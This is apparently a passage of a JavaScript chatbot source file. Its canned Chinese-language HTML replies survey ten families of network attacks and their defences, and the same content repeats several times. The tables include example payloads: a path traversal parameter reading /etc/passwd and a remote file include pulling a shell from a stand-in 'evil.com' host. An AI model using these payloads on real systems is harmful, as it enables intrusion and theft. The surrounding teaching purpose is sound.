        <td>反射型；存储型；DOM-Based</td>
        <td>输出前 HTML 转义；内容安全策略（CSP）；禁用危险 JS API</td>
      </tr>
      <tr>
        <td>跨站请求伪造 CSRF</td>
        <td>利用已认证用户发起非本意的请求</td>
        <td>嵌入恶意表单或图片元素触发后台操作</td>
        <td>CSRF Token 校验；二次确认；SameSite=Strict Cookie</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>5. 高级持续性威胁（APT）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>特点</th>
        <th>攻击手段</th>
        <th>防御思路</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>针对性强、周期长</td>
        <td>社会工程；零日漏洞；内部人威胁</td>
        <td>多层防御（边界+终端+网络监测）；威胁情报共享；持续监控与日志审计；最小权限原则</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>6. 社会工程与钓鱼（Social Engineering & Phishing）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>电子邮件钓鱼</td>
        <td>伪装可信发件人，诱导点击或下载，植入恶意软件或窃取凭据</td>
        <td>欺骗性邮件；伪造登录页面；恶意附件</td>
        <td>安全网关+沙箱分析；员工钓鱼模拟训练；链接/附件双重检测</td>
      </tr>
      <tr>
        <td>电话诈骗</td>
        <td>冒充银行、内勤等，通过电话骗取敏感信息</td>
        <td>“冒充 IT 支持”“冒充领导”</td>
        <td>员工安全培训；严格验证流程；重要事务双重确认</td>
      </tr>
      <tr>
        <td>水坑攻击</td>
        <td>针对特定群体，在其常访问的网站中植入恶意脚本或后门</td>
        <td>在行业论坛/合作伙伴站点注入后门</td>
        <td>隔离外部资源；定期审计合作伙伴安全；启用 WAF</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>7. 客户端攻击（Client-Side Attacks）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>驱动下载攻击</td>
        <td>利用浏览器/插件漏洞，强制下载并执行恶意驱动</td>
        <td>Flash、Java 插件漏洞利用</td>
        <td>去除不必要插件；浏览器沙箱；自动补丁更新</td>
      </tr>
      <tr>
        <td>恶意浏览器扩展</td>
        <td>扩展窃取或篡改用户网页操作</td>
        <td>针对特定扩展的后门或更新机制</td>
        <td>仅安装可信扩展；最小化扩展权限；定期审计已安装扩展</td>
      </tr>
      <tr>
        <td>点击劫持 Clickjacking</td>
        <td>通过透明 iframe 或 CSS 技术覆盖合法按钮</td>
        <td>透明 iframe 覆盖</td>
        <td>设置 <code>X-Frame-Options: DENY</code> 或 CSP <code>frame-ancestors 'none'</code></td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>8. 供应链攻击（Supply Chain Attack）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>软件依赖注入</td>
        <td>在开源库/组件中埋入后门，随合法更新分发</td>
        <td>恶意 NPM、PyPI 包</td>
        <td>私有仓库；依赖审计；锁定版本；SBOM 管理</td>
      </tr>
      <tr>
        <td>硬件后门</td>
        <td>在芯片或固件层面植入后门，或劫持制造流程</td>
        <td>恶意固件刷写；旁路芯片设计</td>
        <td>供应链溯源；硬件入厂检测；可信平台模块（TPM）</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>9. 协议与侧信道攻击（Protocol & Side-Channel）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>DNS 隧道</td>
        <td>利用 DNS 查询/响应隐藏数据传输</td>
        <td>将数据编码到 DNS 请求字段</td>
        <td>严格 DNS 白名单；监控异常查询；启用 DNSSEC</td>
      </tr>
      <tr>
        <td>侧信道攻击</td>
        <td>通过功耗、电磁泄漏、缓存行为等侧面信息窃取密钥</td>
        <td>基于时序；功耗；缓存行冲突</td>
        <td>常数时间运算；硬件隔离；噪声注入</td>
      </tr>
      <tr>
        <td>Rowhammer</td>
        <td>高频访问内存行导致相邻行比特翻转，进而篡改数据</td>
        <td>连续快速读写特定内存地址</td>
        <td>使用 ECC 内存；访问速率限制；硬件厂商补丁</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>10. 文件与资源攻击（File & Resource）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>路径遍历</td>
        <td>利用 <code>../</code> 等符号访问应用不应暴露的文件</td>
        <td>HTTP 参数 <code>?file=../../etc/passwd</code></td>
        <td>规范化并校验路径；禁用直接映射用户输入到文件系统</td>
      </tr>
      <tr>
        <td>远程文件包含 RFI</td>
        <td>引入远程脚本或配置，导致服务端执行外部代码</td>
        <td><code>include("http://evil.com/shell.php")</code></td>
        <td>禁用远程包含；白名单机制；严格 URL 校验</td>
      </tr>
      <tr>
        <td>服务器端请求伪造 SSRF</td>
        <td>利用后端服务向任意内部或外部地址发起请求</td>
        <td>上传 URL 参数，触发内部接口调用</td>
        <td>校验并过滤外部 URL；限制私有网段访问；使用网络隔离</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <p>以上即为较为完整的十类网络攻击与防御措施汇总。可结合自身实际环境，逐项评估、部署并定期演练。</p>
</div>

                `
            ],
            lockAfterUse: false 
        },


                "网络,攻击,哪":{
            reply: [
                `
                <div>
  <p>下面将网络攻击按大类进行归纳，并对每种攻击方式的原理、典型手段及防御措施进行详细讲解。</p>
  <hr>
  <h2 style="color: #e1e1e1e2;">1. <strong>侦察（Reconnaissance）阶段攻击</strong></h2>
  <h3>1.1 网络扫描 (Port Scanning)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：扫描目标主机的开放端口和服务，通过发送 SYN/ACK/FIN 等不同类型的数据包，判断哪些端口在监听服务。</p>
    </li>
    <li>
      <p><strong>典型工具</strong>：Nmap、Masscan。</p>
    </li>
    <li>
      <p><strong>危害</strong>：攻击者据此绘制网络拓扑和服务信息，为后续入侵做准备。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>部署堡垒机或跳板机，限制直连；</li>
        <li>在边界防火墙上关闭或限速 ICMP、TCP/UDP 探测包；</li>
        <li>使用端口敲门（port knocking）等隐蔽技术。</li>
      </ul>
    </li>
  </ul>

  <h3>1.2 信息收集 (Footprinting)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：从公开渠道（WHOIS、DNS、搜索引擎、社交媒体）搜集目标组织的域名、IP、人员邮箱等。</p>
    </li>
    <li>
      <p><strong>危害</strong>：帮助攻击者了解组织架构、技术栈和潜在漏洞。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>对 WHOIS 信息进行隐私保护；</li>
        <li>定期审查并清理过时的 DNS 记录；</li>
        <li>员工安全意识培训，避免在公开渠道泄露敏感信息。</li>
      </ul>
    </li>
  </ul>
  <hr>

  <h2 style="color: #e1e1e1e2;">2. <strong>访问与特权提升阶段攻击</strong></h2>
  <h3>2.1 弱口令攻击 (Brute-Force / Dictionary Attack)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：利用自动化工具对账号进行海量密码猜测。</p>
    </li>
    <li>
      <p><strong>典型工具</strong>：Hydra、John the Ripper。</p>
    </li>
    <li>
      <p><strong>危害</strong>：一旦猜中密码，攻击者可获得系统登录权限，进而横向渗透。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>强制采用高复杂度密码及定期更换；</li>
        <li>启用账户锁定策略（连续失败 N 次后锁定）；</li>
        <li>部署多因素认证（MFA）。</li>
      </ul>
    </li>
  </ul>

  <h3>2.2 利用已知漏洞 (Exploit)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：针对操作系统、应用软件或中间件中的已知安全漏洞，构造特定数据包或代码以取得控制权。</p>
    </li>
    <li>
      <p><strong>典型案例</strong>：</p>
      <ul>
        <li>EternalBlue（利用 SMB 漏洞传播勒索软件）；</li>
        <li>Heartbleed（OpenSSL 缓冲区漏洞）。</li>
      </ul>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>保持系统、应用和补丁的及时更新与管理；</li>
        <li>部署入侵防御系统（IPS）做实时漏洞签名检测；</li>
        <li>定期进行漏洞扫描和渗透测试。</li>
      </ul>
    </li>
  </ul>

  <h3>2.3 绕过身份验证 (Bypass Authentication)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：利用逻辑漏洞或弱配置绕过登录及认证流程。</p>
    </li>
    <li>
      <p><strong>手段</strong>：</p>
      <ul>
        <li>会话固定（Session Fixation）；</li>
        <li>修改 URL 参数或 Cookie。</li>
      </ul>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>使用安全的会话管理库，生成随机 Session ID 并设置 HttpOnly、Secure 标志；</li>
        <li>服务端校验所有输入参数并对关键操作做二次确认。</li>
      </ul>
    </li>
  </ul>
  <hr>

  <h2 style="color: #e1e1e1e2;">3. <strong>信息窃取与破坏阶段攻击</strong></h2>
  <h3>3.1 中间人攻击 (Man-in-the-Middle, MITM)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：攻击者在通信双方之间截获、篡改或伪造数据包。</p>
    </li>
    <li>
      <p><strong>手段</strong>：</p>
      <ul>
        <li>ARP 欺骗（ARP Poisoning）；</li>
        <li>DNS 欺骗／DNS 污染；</li>
        <li>Wi-Fi 热点嗅探。</li>
      </ul>
    </li>
    <li>
      <p><strong>危害</strong>：窃取敏感信息（账号密码、会话令牌），甚至注入恶意代码。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>强制使用 HTTPS/TLS，校验证书链；</li>
        <li>在局域网部署动态 ARP 检测（DAI）；</li>
        <li>通过 VPN 隧道加密流量。</li>
      </ul>
    </li>
  </ul>

  <h3>3.2 拒绝服务攻击 (Denial of Service / Distributed DoS)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：向目标主机或网络发送海量合法或畸形的数据包，耗尽带宽、计算或存储资源，导致服务中断。</p>
    </li>
    <li>
      <p><strong>类型</strong>：</p>
      <ul>
        <li><strong>SYN Flood</strong>：利用半连接队列耗尽；</li>
        <li><strong>UDP Flood / ICMP Flood</strong>；</li>
        <li><strong>HTTP Flood</strong>：模拟大量 HTTP 请求。</li>
      </ul>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>部署 DDoS 防护服务（如 CDN + 云端清洗）；</li>
        <li>启用 SYN Cookies，限制半连接队列；</li>
        <li>配置访问频率限制（Rate Limiting）。</li>
      </ul>
    </li>
  </ul>

  <h3>3.3 恶意软件 (Malware)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：通过木马、蠕虫、勒索软件、间谍软件等程序获取控制权限或破坏系统。</p>
    </li>
    <li>
      <p><strong>传播途径</strong>：钓鱼邮件附件、恶意广告、漏洞利用。</p>
    </li>
    <li>
      <p><strong>危害</strong>：数据加密勒索、远程控制（RAT）、信息窃取。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>部署终端防护（杀毒 + EDR）；</li>
        <li>限制用户权限，关闭非必要服务；</li>
        <li>员工安全培训，防范钓鱼攻击。</li>
      </ul>
    </li>
  </ul>
  <hr>

  <h2 style="color: #e1e1e1e2;">4. <strong>应用层攻击</strong></h2>
  <h3>4.1 SQL 注入 (SQL Injection)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：在输入字段中嵌入恶意 SQL 语句，通过拼接漏洞操纵数据库。</p>
    </li>
    <li>
      <p><strong>危害</strong>：可直接读取、修改、删除数据库中的敏感数据，甚至获取操作系统权限。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>使用参数化查询或预编译语句；</li>
        <li>对所有输入进行严格校验和转义；</li>
        <li>最小化数据库账户权限。</li>
      </ul>
    </li>
  </ul>

  <h3>4.2 跨站脚本 (Cross-Site Scripting, XSS)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：向 Web 应用注入恶意脚本，当其他用户访问页面时，脚本在其浏览器中执行。</p>
    </li>
    <li>
      <p><strong>类型</strong>：</p>
      <ul>
        <li><strong>反射型</strong>（Reflected XSS）</li>
        <li><strong>存储型</strong>（Stored XSS）</li>
        <li><strong>DOM-Based XSS</strong></li>
      </ul>
    </li>
    <li>
      <p><strong>危害</strong>：窃取 Cookie、会话令牌，甚至进行钓鱼、木马下载等二次攻击。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>在输出到页面前对所有用户输入做 HTML 转义；</li>
        <li>使用内容安全策略 (CSP) 限制脚本加载源；</li>
        <li>禁用危险的 JavaScript API。</li>
      </ul>
    </li>
  </ul>

  <h3>4.3 跨站请求伪造 (Cross-Site Request Forgery, CSRF)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：诱导认证用户在已登录状态下发起非本意的请求。</p>
    </li>
    <li>
      <p><strong>危害</strong>：在用户不知情的情况下完成资金转账、邮件删除等敏感操作。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>在表单中嵌入并校验随机的 CSRF Token；</li>
        <li>对敏感操作使用二次确认或验证码；</li>
        <li>设置 SameSite = Strict 的 Cookie。</li>
      </ul>
    </li>
  </ul>
  <hr>

  <h2 style="color: #e1e1e1e2;">5. <strong>高级持续性威胁（APT）</strong></h2>
  <ul>
    <li>
      <p><strong>特点</strong>：针对特定组织或国家级目标，攻击周期长、手段多样（包括社会工程、零日漏洞、内部人威胁等），追求长时间潜伏与数据外传。</p>
    </li>
    <li>
      <p><strong>防御思路</strong>：</p>
      <ol>
        <li><strong>多层防御</strong>：边界防护、终端检测、网络流量分析（NTA）协同；</li>
        <li><strong>威胁情报</strong>：及时获取与分享最新攻击手法和 IOCs（Indicator of Compromise）；</li>
        <li><strong>安全运维</strong>：持续监控、日志审计、红蓝对抗演练；</li>
        <li><strong>最小权限</strong>：严格执行权限分离与访问控制策略。</li>
      </ol>
    </li>
  </ul>
  <hr>
  <p>以上所列并非穷尽，但涵盖了大多数常见且危害严重的网络攻击类型。实际防御中，应结合自身业务特点，构建立体化的“人—技术—流程”安全体系，持续更新与优化。</p>
</div>

                `,

                `
                <div>
  <p>以下是10种网络攻击类型的讲解</p>
  <hr>
  <h3>1. 侦察（Reconnaissance）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>网络扫描</td>
        <td>探测主机开放端口和服务，通过不同数据包类型判断状态</td>
        <td>Nmap、Masscan</td>
        <td>关闭不必要端口；防火墙限速/丢弃探测包；端口敲门</td>
      </tr>
      <tr>
        <td>信息收集</td>
        <td>从公开渠道搜集域名、IP、人员信息，绘制网络资产清单</td>
        <td>WHOIS 隐私信息；DNS 枚举；搜索引擎；社交媒体</td>
        <td>WHOIS 隐私保护；定期清理 DNS 记录；员工安全培训</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>2. 访问与特权提升（Access & Privilege Escalation）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>弱口令攻击</td>
        <td>通过字典或暴力手段海量猜测破解用户密码</td>
        <td>Hydra、John the Ripper</td>
        <td>强密码；账户锁定；多因素认证（MFA）</td>
      </tr>
      <tr>
        <td>利用已知漏洞</td>
        <td>针对系统/应用漏洞构造特定数据包或代码取得控制</td>
        <td>EternalBlue、Heartbleed</td>
        <td>补丁管理；入侵防御系统（IPS）；定期漏洞扫描与渗透测试</td>
      </tr>
      <tr>
        <td>绕过身份验证</td>
        <td>利用逻辑漏洞或配置缺陷绕过登录或认证流程</td>
        <td>会话固定（Session Fixation）；篡改 Cookie/URL</td>
        <td>安全会话管理；参数校验；关键操作二次确认</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>3. 信息窃取与破坏（Data Theft & Disruption）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>中间人攻击 MITM</td>
        <td>截获、篡改或伪造通信数据</td>
        <td>ARP 欺骗；DNS 污染；Wi-Fi 热点嗅探</td>
        <td>强制 HTTPS/TLS；动态 ARP 检测；VPN 隧道</td>
      </tr>
      <tr>
        <td>拒绝服务 DoS/DDoS</td>
        <td>消耗目标带宽/资源，导致服务不可用</td>
        <td>SYN Flood；UDP/ICMP Flood；HTTP Flood</td>
        <td>云端 DDoS 防护；SYN Cookies；访问频率限制</td>
      </tr>
      <tr>
        <td>恶意软件 Malware</td>
        <td>通过木马、蠕虫、勒索或间谍程序侵入并破坏/窃取</td>
        <td>钓鱼附件；恶意广告；漏洞利用</td>
        <td>终端防护（杀毒+EDR）；最小权限；员工安全培训</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>4. 应用层攻击（Application-Layer）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>SQL 注入</td>
        <td>在输入字段嵌入恶意 SQL 语句，操纵数据库</td>
        <td>拼接漏洞利用；盲注</td>
        <td>参数化查询/预编译；输入校验与转义；最小化数据库权限</td>
      </tr>
      <tr>
        <td>跨站脚本 XSS</td>
        <td>注入恶意脚本至页面，使浏览者浏览时执行</td>
        <td>反射型；存储型；DOM-Based</td>
        <td>输出前 HTML 转义；内容安全策略（CSP）；禁用危险 JS API</td>
      </tr>
      <tr>
        <td>跨站请求伪造 CSRF</td>
        <td>利用已认证用户发起非本意的请求</td>
        <td>嵌入恶意表单或图片元素触发后台操作</td>
        <td>CSRF Token 校验；二次确认；SameSite=Strict Cookie</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>5. 高级持续性威胁（APT）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>特点</th>
        <th>攻击手段</th>
        <th>防御思路</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>针对性强、周期长</td>
        <td>社会工程；零日漏洞；内部人威胁</td>
        <td>多层防御（边界+终端+网络监测）；威胁情报共享；持续监控与日志审计；最小权限原则</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>6. 社会工程与钓鱼（Social Engineering & Phishing）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>电子邮件钓鱼</td>
        <td>伪装可信发件人，诱导点击或下载，植入恶意软件或窃取凭据</td>
        <td>欺骗性邮件；伪造登录页面；恶意附件</td>
        <td>安全网关+沙箱分析；员工钓鱼模拟训练；链接/附件双重检测</td>
      </tr>
      <tr>
        <td>电话诈骗</td>
        <td>冒充银行、内勤等，通过电话骗取敏感信息</td>
        <td>“冒充 IT 支持”“冒充领导”</td>
        <td>员工安全培训；严格验证流程；重要事务双重确认</td>
      </tr>
      <tr>
        <td>水坑攻击</td>
        <td>针对特定群体，在其常访问的网站中植入恶意脚本或后门</td>
        <td>在行业论坛/合作伙伴站点注入后门</td>
        <td>隔离外部资源；定期审计合作伙伴安全；启用 WAF</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>7. 客户端攻击（Client-Side Attacks）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>驱动下载攻击</td>
        <td>利用浏览器/插件漏洞，强制下载并执行恶意驱动</td>
        <td>Flash、Java 插件漏洞利用</td>
        <td>去除不必要插件；浏览器沙箱；自动补丁更新</td>
      </tr>
      <tr>
        <td>恶意浏览器扩展</td>
        <td>扩展窃取或篡改用户网页操作</td>
        <td>针对特定扩展的后门或更新机制</td>
        <td>仅安装可信扩展；最小化扩展权限；定期审计已安装扩展</td>
      </tr>
      <tr>
        <td>点击劫持 Clickjacking</td>
        <td>通过透明 iframe 或 CSS 技术覆盖合法按钮</td>
        <td>透明 iframe 覆盖</td>
        <td>设置 <code>X-Frame-Options: DENY</code> 或 CSP <code>frame-ancestors 'none'</code></td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>8. 供应链攻击（Supply Chain Attack）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>软件依赖注入</td>
        <td>在开源库/组件中埋入后门，随合法更新分发</td>
        <td>恶意 NPM、PyPI 包</td>
        <td>私有仓库；依赖审计；锁定版本；SBOM 管理</td>
      </tr>
      <tr>
        <td>硬件后门</td>
        <td>在芯片或固件层面植入后门，或劫持制造流程</td>
        <td>恶意固件刷写；旁路芯片设计</td>
        <td>供应链溯源；硬件入厂检测；可信平台模块（TPM）</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>9. 协议与侧信道攻击（Protocol & Side-Channel）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>DNS 隧道</td>
        <td>利用 DNS 查询/响应隐藏数据传输</td>
        <td>将数据编码到 DNS 请求字段</td>
        <td>严格 DNS 白名单；监控异常查询；启用 DNSSEC</td>
      </tr>
      <tr>
        <td>侧信道攻击</td>
        <td>通过功耗、电磁泄漏、缓存行为等侧面信息窃取密钥</td>
        <td>基于时序；功耗；缓存行冲突</td>
        <td>常数时间运算；硬件隔离；噪声注入</td>
      </tr>
      <tr>
        <td>Rowhammer</td>
        <td>高频访问内存行导致相邻行比特翻转，进而篡改数据</td>
        <td>连续快速读写特定内存地址</td>
        <td>使用 ECC 内存；访问速率限制；硬件厂商补丁</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>10. 文件与资源攻击（File & Resource）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>路径遍历</td>
        <td>利用 <code>../</code> 等符号访问应用不应暴露的文件</td>
        <td>HTTP 参数 <code>?file=../../etc/passwd</code></td>
        <td>规范化并校验路径；禁用直接映射用户输入到文件系统</td>
      </tr>
      <tr>
        <td>远程文件包含 RFI</td>
        <td>引入远程脚本或配置，导致服务端执行外部代码</td>
        <td><code>include("http://evil.com/shell.php")</code></td>
        <td>禁用远程包含；白名单机制；严格 URL 校验</td>
      </tr>
      <tr>
        <td>服务器端请求伪造 SSRF</td>
        <td>利用后端服务向任意内部或外部地址发起请求</td>
        <td>上传 URL 参数，触发内部接口调用</td>
        <td>校验并过滤外部 URL；限制私有网段访问；使用网络隔离</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <p>以上即为较为完整的十类网络攻击与防御措施汇总。可结合自身实际环境，逐项评估、部署并定期演练。</p>
</div>

                `
            ],
            lockAfterUse: false 
        },

                "网络,攻击,几":{
            reply: [
                `
                <div>
  <p>下面将网络攻击按大类进行归纳，并对每种攻击方式的原理、典型手段及防御措施进行详细讲解。</p>
  <hr>
  <h2 style="color: #e1e1e1e2;">1. <strong>侦察（Reconnaissance）阶段攻击</strong></h2>
  <h3>1.1 网络扫描 (Port Scanning)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：扫描目标主机的开放端口和服务，通过发送 SYN/ACK/FIN 等不同类型的数据包，判断哪些端口在监听服务。</p>
    </li>
    <li>
      <p><strong>典型工具</strong>：Nmap、Masscan。</p>
    </li>
    <li>
      <p><strong>危害</strong>：攻击者据此绘制网络拓扑和服务信息，为后续入侵做准备。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>部署堡垒机或跳板机，限制直连；</li>
        <li>在边界防火墙上关闭或限速 ICMP、TCP/UDP 探测包；</li>
        <li>使用端口敲门（port knocking）等隐蔽技术。</li>
      </ul>
    </li>
  </ul>

  <h3>1.2 信息收集 (Footprinting)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：从公开渠道（WHOIS、DNS、搜索引擎、社交媒体）搜集目标组织的域名、IP、人员邮箱等。</p>
    </li>
    <li>
      <p><strong>危害</strong>：帮助攻击者了解组织架构、技术栈和潜在漏洞。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>对 WHOIS 信息进行隐私保护；</li>
        <li>定期审查并清理过时的 DNS 记录；</li>
        <li>员工安全意识培训，避免在公开渠道泄露敏感信息。</li>
      </ul>
    </li>
  </ul>
  <hr>

  <h2 style="color: #e1e1e1e2;">2. <strong>访问与特权提升阶段攻击</strong></h2>
  <h3>2.1 弱口令攻击 (Brute-Force / Dictionary Attack)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：利用自动化工具对账号进行海量密码猜测。</p>
    </li>
    <li>
      <p><strong>典型工具</strong>：Hydra、John the Ripper。</p>
    </li>
    <li>
      <p><strong>危害</strong>：一旦猜中密码，攻击者可获得系统登录权限，进而横向渗透。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>强制采用高复杂度密码及定期更换；</li>
        <li>启用账户锁定策略（连续失败 N 次后锁定）；</li>
        <li>部署多因素认证（MFA）。</li>
      </ul>
    </li>
  </ul>

  <h3>2.2 利用已知漏洞 (Exploit)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：针对操作系统、应用软件或中间件中的已知安全漏洞，构造特定数据包或代码以取得控制权。</p>
    </li>
    <li>
      <p><strong>典型案例</strong>：</p>
      <ul>
        <li>EternalBlue（利用 SMB 漏洞传播勒索软件）；</li>
        <li>Heartbleed（OpenSSL 缓冲区漏洞）。</li>
      </ul>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>保持系统、应用和补丁的及时更新与管理；</li>
        <li>部署入侵防御系统（IPS）做实时漏洞签名检测；</li>
        <li>定期进行漏洞扫描和渗透测试。</li>
      </ul>
    </li>
  </ul>

  <h3>2.3 绕过身份验证 (Bypass Authentication)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：利用逻辑漏洞或弱配置绕过登录及认证流程。</p>
    </li>
    <li>
      <p><strong>手段</strong>：</p>
      <ul>
        <li>会话固定（Session Fixation）；</li>
        <li>修改 URL 参数或 Cookie。</li>
      </ul>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>使用安全的会话管理库，生成随机 Session ID 并设置 HttpOnly、Secure 标志；</li>
        <li>服务端校验所有输入参数并对关键操作做二次确认。</li>
      </ul>
    </li>
  </ul>
  <hr>

  <h2 style="color: #e1e1e1e2;">3. <strong>信息窃取与破坏阶段攻击</strong></h2>
  <h3>3.1 中间人攻击 (Man-in-the-Middle, MITM)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：攻击者在通信双方之间截获、篡改或伪造数据包。</p>
    </li>
    <li>
      <p><strong>手段</strong>：</p>
      <ul>
        <li>ARP 欺骗（ARP Poisoning）；</li>
        <li>DNS 欺骗／DNS 污染；</li>
        <li>Wi-Fi 热点嗅探。</li>
      </ul>
    </li>
    <li>
      <p><strong>危害</strong>：窃取敏感信息（账号密码、会话令牌），甚至注入恶意代码。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>强制使用 HTTPS/TLS，校验证书链；</li>
        <li>在局域网部署动态 ARP 检测（DAI）；</li>
        <li>通过 VPN 隧道加密流量。</li>
      </ul>
    </li>
  </ul>

  <h3>3.2 拒绝服务攻击 (Denial of Service / Distributed DoS)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：向目标主机或网络发送海量合法或畸形的数据包，耗尽带宽、计算或存储资源，导致服务中断。</p>
    </li>
    <li>
      <p><strong>类型</strong>：</p>
      <ul>
        <li><strong>SYN Flood</strong>：利用半连接队列耗尽；</li>
        <li><strong>UDP Flood / ICMP Flood</strong>；</li>
        <li><strong>HTTP Flood</strong>：模拟大量 HTTP 请求。</li>
      </ul>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>部署 DDoS 防护服务（如 CDN + 云端清洗）；</li>
        <li>启用 SYN Cookies，限制半连接队列；</li>
        <li>配置访问频率限制（Rate Limiting）。</li>
      </ul>
    </li>
  </ul>

  <h3>3.3 恶意软件 (Malware)</h3>
  <ul>
    <li>
